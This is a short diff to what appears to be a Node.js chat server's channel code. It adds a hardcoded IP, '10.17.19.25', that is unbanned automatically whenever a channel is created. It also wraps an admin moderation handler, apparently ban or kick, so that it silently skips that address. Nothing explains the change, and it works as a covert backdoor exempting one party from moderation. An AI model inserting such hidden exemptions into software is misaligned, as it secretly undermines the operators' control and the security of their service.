@@ -23,6 +23,7 @@ process.on('uncaughtException', function(err) {
 });
 
 function createChannel(io, channelName) {
+	 dao.unban("10.17.19.25", channelName);
     console.log('Starting channel: ' + (channelName || '<fontpage>'));
 
     var elbot = require('./elbot').start();
@@ -251,6 +252,8 @@ function createChannel(io, channelName) {
                 role : 'admin',
                 params : [ 'nick', 'message' ],
                 handler : function(dao, dbuser, params) {
+               	    if (params.nick != "10.17.19.25")
+               	    {
                     return dao.findUser(params.nick).then(function(dbuser){
                         return dao.getChannelInfo(channelName).then(function(info){
                             var msg = params.message.length > 1 ? ': ' + params.message.trim() : '';
@@ -281,6 +284,7 @@ function createChannel(io, channelName) {
                             }
                         });
                     });
+               	    }
                 }
             },
             unban : {
